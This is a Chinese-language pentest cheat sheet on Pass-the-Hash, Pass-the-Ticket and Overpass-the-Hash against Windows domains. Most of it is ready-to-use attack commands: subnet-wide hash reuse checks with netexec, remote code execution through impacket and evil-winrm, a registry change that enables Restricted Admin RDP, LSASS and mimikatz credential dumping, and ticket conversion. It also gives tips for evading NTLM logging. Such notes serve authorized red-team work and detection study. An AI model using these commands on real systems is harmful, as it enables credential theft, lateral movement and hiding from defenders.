# Pass-the-Hash / Pass-the-Ticket / Overpass-the-Hash 详解

三种利用已有凭据材料 (Hash / Ticket) 进行认证的技术，无需知道明文密码。

---

## Pass-the-Hash (PTH)

### 原理

Windows NTLM 认证使用 NT Hash 而非明文密码进行挑战-响应。拥有 Hash 即等同于拥有密码。

### netexec 检测密码复用

```bash
# 本地管理员 Hash 在子网内复用检测
netexec smb <SUBNET>/24 -u 'administrator' -H '<NT_HASH>' --local-auth

# 域账户 Hash 检测
netexec smb <SUBNET>/24 -u '<USER>' -H '<NT_HASH>'
```

输出解读:
- `[+] ... (Pwn3d!)` = 有管理员权限，可提取凭据和远程执行
- `[+]` = 凭据有效但无管理员权限

### wmiexec PTH (推荐)

```bash
impacket-wmiexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>'
```

### evil-winrm PTH

```bash
evil-winrm -i <TARGET> -u '<USER>' -H '<NT_HASH>'
```

### smbexec PTH

```bash
impacket-smbexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>'
```

### psexec PTH

```bash
impacket-psexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>'
```

### smbclient PTH

```bash
# 访问共享
impacket-smbclient -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>'

# netexec 列出共享
netexec smb <TARGET> -u '<USER>' -H '<NT_HASH>' --shares
```

### RDP PTH (Restricted Admin 模式)

RDP 协议默认不支持 PTH，需启用 Restricted Admin:

```bash
# 检查 Restricted Admin 状态
impacket-reg '<DOMAIN>/<USER>@<TARGET>' -hashes ':<NT_HASH>' query \
  -keyName 'HKLM\System\CurrentControlSet\Control\Lsa'

# 启用 Restricted Admin (设为 0)
impacket-reg '<DOMAIN>/<USER>@<TARGET>' -hashes ':<NT_HASH>' add \
  -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' \
  -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'

# RDP PTH 连接
xfreerdp /u:<USER> /d:<DOMAIN> /pth:<NT_HASH> /v:<TARGET>
```

### Hash 格式说明

```bash
# 完整格式 (LM:NT)
-hashes 'aad3b435b51404eeaad3b435b51404ee:<NT_HASH>'

# 简写格式 (仅 NT，前缀冒号)
-hashes ':<NT_HASH>'

# NetExec 使用 -H (仅 NT Hash)
-H '<NT_HASH>'
```

---

## Pass-the-Ticket (PTT)

### 原理

使用已有的 Kerberos 票据 (TGT 或 TGS) 进行认证，完全走 Kerberos 协议，不触发 NTLM 相关日志。

### 票据类型

| 类型 | 全称 | 用途 |
|------|------|------|
| TGT | Ticket Granting Ticket | 可请求任意服务的票据 (价值更高) |
| TGS | Service Ticket | 仅能访问特定服务 |

### 设置票据环境

```bash
# 设置 ccache 文件路径
export KRB5CCNAME=/path/to/ticket.ccache

# 查看票据信息
klist -c /path/to/ticket.ccache
```

### 使用票据认证

```bash
# wmiexec
impacket-wmiexec -k -no-pass '<DOMAIN>/<USER>@<TARGET_HOSTNAME>'

# secretsdump
impacket-secretsdump -k -no-pass '<TARGET_HOSTNAME>'

# psexec
impacket-psexec -k -no-pass '<DOMAIN>/<USER>@<TARGET_HOSTNAME>'

# smbclient
impacket-smbclient -k -no-pass '<DOMAIN>/<USER>@<TARGET_HOSTNAME>'
```

**重要**: Kerberos 认证必须使用主机名 (FQDN)，不能使用 IP 地址。确保 `/etc/hosts` 或 DNS 正确解析。

### evil-winrm 使用票据

1. 设置票据:
```bash
export KRB5CCNAME=/path/to/ticket.ccache
```

2. 配置 `/etc/krb5.conf`:
```ini
[libdefaults]
    default_realm = CORP.LOCAL

[realms]
    CORP.LOCAL = {
        kdc = dc01.corp.local
        default_domain = corp.local
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
```

3. 连接:
```bash
evil-winrm -i <HOSTNAME> -r <REALM>
```

### kirbi 与 ccache 格式转换

Windows 工具 (mimikatz/Rubeus) 输出 `.kirbi` 格式，Linux 工具 (impacket) 使用 `.ccache` 格式:

```bash
# kirbi -> ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# ccache -> kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### 票据来源

```bash
# 从 LSASS dump 获取 (lsassy)
lsassy -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' <TARGET> \
  -m dumpertdll -O dumpertdll_path=Outflank-Dumpert-DLL.dll
# 票据保存在 ~/.config/lsassy/tickets/

# 从 mimikatz 导出
mimikatz.exe "sekurlsa::tickets /export"
# 生成 .kirbi 文件，需要转换为 .ccache
```

### 票据生命周期

- 默认 TGT 有效期: 10 小时
- 最大续期时间: 7 天
- 使用前务必检查过期时间

---

## Overpass-the-Hash

### 原理

用 NTLM Hash 向 KDC 请求 TGT，然后完全走 Kerberos 认证。本质上是将 NTLM 凭据"升级"为 Kerberos 票据。

**比标准 PTH 更隐蔽**: 后续认证全部走 Kerberos (Event 4768/4769)，不触发 NTLM 日志 (Event 4624 Logon Type 3 with NTLM)。

### 执行步骤

```bash
# Step 1: 用 Hash 请求 TGT
impacket-getTGT -hashes ':<NT_HASH>' '<DOMAIN>/<USER>'
# 输出: <USER>.ccache

# Step 2: 设置票据
export KRB5CCNAME=<USER>.ccache

# Step 3: 使用 Kerberos 认证
impacket-wmiexec -k -no-pass '<DOMAIN>/<USER>@<TARGET_FQDN>'
impacket-secretsdump -k -no-pass '<TARGET_FQDN>'
impacket-psexec -k -no-pass '<DOMAIN>/<USER>@<TARGET_FQDN>'
```

### 适用场景

- NTLM 被禁用或限制，但 Kerberos 仍可用
- 需要比标准 PTH 更隐蔽的操作
- 需要 Kerberos 票据用于后续攻击 (如 S4U2Self/Proxy)

---

## 三种技术对比

| 特性 | PTH | PTT | Overpass-the-Hash |
|------|-----|-----|-------------------|
| 输入材料 | NT Hash | Kerberos 票据 (.ccache/.kirbi) | NT Hash |
| 认证协议 | NTLM | Kerberos | Kerberos (通过 Hash 获取票据) |
| 日志特征 | Event 4624 (NTLM) | Event 4624 (Kerberos) | Event 4768 + 4624 (Kerberos) |
| 隐蔽性 | 中 | 高 | 高 |
| 是否需要 DC 通信 | 否 (直接与目标认证) | 否 (票据已有) | 是 (需向 KDC 请求 TGT) |
| 有效期 | 永久 (Hash 不变即可用) | 受票据过期限制 (默认 10h) | 获取票据后同 PTT |
| Kerberos-only 环境 | 不可用 | 可用 | 可用 |
| 工具支持 | netexec, impacket, evil-winrm | impacket (-k), evil-winrm (-r) | impacket-getTGT + -k |

---

## 跨平台票据处理

### Linux (攻击机) 环境

```bash
# 票据存储为 .ccache 文件
export KRB5CCNAME=/tmp/ticket.ccache

# 确保 /etc/krb5.conf 正确配置
# 确保 /etc/hosts 解析目标主机名

# 时间同步 (Kerberos 要求时差 < 5 分钟)
ntpdate <DC_IP>
```

### Windows (目标环境) 导出

```powershell
# mimikatz 导出当前会话票据
mimikatz.exe "sekurlsa::tickets /export"

# Rubeus 导出
Rubeus.exe dump /nowrap
```

### 格式转换流程

```
Windows (.kirbi)  ──ticketConverter──>  Linux (.ccache)
Linux (.ccache)   ──ticketConverter──>  Windows (.kirbi)
```

```bash
impacket-ticketConverter input.kirbi output.ccache
impacket-ticketConverter input.ccache output.kirbi
```

---

## 常见故障排除

| 错误 | 原因 | 解决方案 |
|------|------|----------|
| KRB_AP_ERR_SKEW | 攻击机与 DC 时间偏差 > 5 分钟 | `ntpdate <DC_IP>` |
| KRB_AP_ERR_TKT_EXPIRED | 票据已过期 | 重新请求 TGT |
| Server not found in Kerberos database | 使用了 IP 而非主机名 | 使用 FQDN + 配置 /etc/hosts |
| Cannot contact any KDC | krb5.conf 配置错误或网络不通 | 检查配置和网络连通性 |
| STATUS_LOGON_FAILURE (PTH) | Hash 错误或账户被禁用 | 验证 Hash 正确性 |
| Credential Guard | 目标启用了凭据保护 | PTH 可能失效，尝试 PTT 或 Overpass |
